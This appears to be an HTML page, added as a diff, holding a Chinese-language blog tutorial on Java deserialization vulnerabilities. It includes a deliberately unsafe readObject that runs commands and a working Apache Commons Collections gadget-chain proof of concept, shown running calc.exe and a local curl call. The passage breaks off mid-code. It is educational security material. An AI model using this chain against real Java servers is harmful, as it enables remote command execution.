@@ -1,0 +1,1515 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="Apimgg1hM4">
+<meta name="google-site-verification" content="ifZoQ94LmUy8sy2SVlrhnNGumEzL2SSrC4MQAq67iic">
+<meta name="msvalidate.01" content="73A8DED7002B26724C9E7637DAE89C20">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java,反序列化,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Boogle's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="0x00 序列化与反序列化什么是序列化和反序列化 序列化是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为反序列化。 为什么要序列化和反序列化类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，就需要通过序列化将数据转换为字节流进行存储或者传输，在合适的地方通过对字节流反序列化继续调用该类。">
+<meta name="keywords" content="java,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化入门">
+<meta property="og:url" content="http://zhengbao.wang/java反序列化入门/index.html">
+<meta property="og:site_name" content="Boogle&#39;s Blog">
+<meta property="og:description" content="0x00 序列化与反序列化什么是序列化和反序列化 序列化是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为反序列化。 为什么要序列化和反序列化类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，就需要通过序列化将数据转换为字节流进行存储或者传输，在合适的地方通过对字节流反序列化继续调用该类。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/NWX9jg2kGU6uaSB.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/NxSZBvh4zpD6MbG.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/aMrJC8OvkxAHudU.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/qvzHV5ctfxupS9A.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/lbJuea15jhGEoBq.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/nWxA7wyCIkLdSqf.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/KCDPxJo4U81zfXg.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/SsZp4Xo6YvEcuiH.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/puPkyxXLhRr8jQ7.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/xt6WDrYXZjoa4iI.png">
+<meta property="og:updated_time" content="2019-11-27T12:37:18.241Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="java反序列化入门">
+<meta name="twitter:description" content="0x00 序列化与反序列化什么是序列化和反序列化 序列化是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为反序列化。 为什么要序列化和反序列化类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，就需要通过序列化将数据转换为字节流进行存储或者传输，在合适的地方通过对字节流反序列化继续调用该类。">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/27/NWX9jg2kGU6uaSB.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://zhengbao.wang/java反序列化入门/">
+
+
+
+
+
+  <title>java反序列化入门 | Boogle's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Boogle's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">没有网络安全，就没有国家安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/java反序列化入门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java反序列化入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-27T20:36:08+08:00">
+                2019-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/java反序列化入门/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/java反序列化入门/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/java反序列化入门/" class="leancloud_visitors" data-flag-title="java反序列化入门">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  27 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-序列化与反序列化"><a href="#0x00-序列化与反序列化" class="headerlink" title="0x00 序列化与反序列化"></a>0x00 序列化与反序列化</h2><h3 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h3><p> <strong>序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。</p>
+<h3 id="为什么要序列化和反序列化"><a href="#为什么要序列化和反序列化" class="headerlink" title="为什么要序列化和反序列化"></a>为什么要序列化和反序列化</h3><p>类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，就需要通过序列化将数据转换为字节流进行存储或者传输，在合适的地方通过对字节流反序列化继续调用该类。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。 </p>
+<h3 id="如何进行序列化和反序列化"><a href="#如何进行序列化和反序列化" class="headerlink" title="如何进行序列化和反序列化"></a>如何进行序列化和反序列化</h3><p>通过<code>ObjectOutputStream</code>类的<code>writeObject(Object obj)</code>方法可以实现序列化。</p>
+<p>通过<code>ObjectInputStream</code>类的<code>readObject(Object obj)</code> 方法可以实现发序列化。</p>
+<p>一个类的对象要想序列化成功，需要满足两个条件：</p>
+<ul>
+<li><ol>
+<li>该类必须实现 <code>java.io.Serializable</code> 接口。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li>
+</ol>
+</li>
+</ul>
+<p>下面使用一个Demo来演示该过程。</p>
+<p>一个满足上述序列化条件的任意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我是Student的print,下面是我输出的内容："</span>);</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>序列化Demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">"boogle"</span>);</span><br><span class="line">        stu.print();</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(stu);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过上面的序列化Demo，将序列化后的字节流保存在了<code>object.ser</code>文件中。</p>
+<p>查看该文件，可以看到序列化特征头<code>AC ED 00 05</code></p>
+<p><img src="https://i.loli.net/2019/11/27/NWX9jg2kGU6uaSB.png" alt></p>
+<p>然后写一个反序列化Demo,将上面的字节流文件还原为对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeSerImp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 以下就是反序列化操作</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);  </span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);      </span><br><span class="line">       </span><br><span class="line">        Student deSerObj = (Student) ois.readObject();</span><br><span class="line">        System.out.println(deSerObj);</span><br><span class="line">        deSerObj.print();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行后输出</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Student@b815859</span><br><span class="line">我是Student的<span class="built_in">print</span>,下面是我输出的内容：</span><br><span class="line">boogle</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><p>在java反序列化的过程中，会调用反序列化类的<code>readObject()</code>方法，如果该方法书写不当，将会产生反序列化漏洞。</p>
+<p>我们对上面的<code>Student</code>类稍加修改，重写其<code>readObject()</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//添加cmd属性，用于要执行的命令</span></span><br><span class="line">    <span class="keyword">public</span> String cmd = <span class="string">"calc.exe"</span>; </span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我是Student的print,下面是我输出的内容："</span>);</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用之前的代码，对该类重新进行序列化反序列化后，将会运行<code>readObject</code>方法里的命令，弹出计算器。</p>
+<p><img src="https://i.loli.net/2019/11/27/NxSZBvh4zpD6MbG.png" alt></p>
+<p>此时在序列化时将<code>cmd</code>赋值为任意命令，便可以执行任意命令。</p>
+<p><img src="https://i.loli.net/2019/11/27/aMrJC8OvkxAHudU.png" alt></p>
+<p>当然，这仅仅是一个测试的Demo，真实的代码中可能并不会出现入此低级的问题，但在真实环境中，可以通过一些列的调用代码链，最终达到上述Demo所实现的执行任意命令的效果。下面引入一个实例: Apache Commons Collections反序列化漏洞。</p>
+<h2 id="0x02-Apache-Commons-Collections反序列化漏洞"><a href="#0x02-Apache-Commons-Collections反序列化漏洞" class="headerlink" title="0x02  Apache Commons Collections反序列化漏洞"></a>0x02  Apache Commons Collections反序列化漏洞</h2><p> Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。  WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等均使用了该第三方库。</p>
+<p>在2015年11月6日FoxGlove Security安全团队的@breenmachine公布了Apache Commons Collections配合java反序列化漏洞实现远程命令执行的真实案例，使用了该库的各大java Web Server都受到影响。</p>
+<p>首先搭建漏洞环境，在<code>web.xml</code>中添加以下配置获取受影响的<code>commons-collections</code>版本。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>Commons Collections</code>中实现了对Java标准数据结构Map接口的一个扩展类<code>TransformedMap</code>。 该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换， 具体的变换逻辑由Transformer类定义 。</p>
+<p>查看<code>Transformer</code>接口类的具体实现，其问题出现在<code>InvokerTransformer</code>类。</p>
+<p><img src="https://i.loli.net/2019/11/27/qvzHV5ctfxupS9A.png" alt></p>
+<p>查看<code>InvokerTransformer</code>类实现的<code>transform</code>方法， 该方法中采用了反射的方法进行函数调用，其中的参数均为可控参数，因为可控制该方法实现任意代码执行。</p>
+<p><img src="https://i.loli.net/2019/11/27/lbJuea15jhGEoBq.png" alt></p>
+<p>那么现在可以通过 可以通过<code>TransformedMap.decorate()</code>方法，获得一个<code>TransformedMap</code>的实例。  当该实例内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法，执行任意命令。</p>
+<p>现在进行Demo测试。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedmap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"123"</span>);  <span class="comment">//对value进行改变时将触发transform()方法</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功弹出计算器</p>
+<p><img src="https://i.loli.net/2019/11/27/nWxA7wyCIkLdSqf.png" alt></p>
+<p>现在想要在反序列化中进行利用，需要在<code>readObject</code>方法中对Map进行其<code>value</code>值的改变，我们修改上面的<code>Student</code>类，使其满足我们这一美好的愿望。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Map map;</span><br><span class="line"></span><br><span class="line">    Student(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后构造利用poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">"boogle"</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"curl 127.0.0.1:8000/poc_test"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        stu.map = transformedmap;</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span 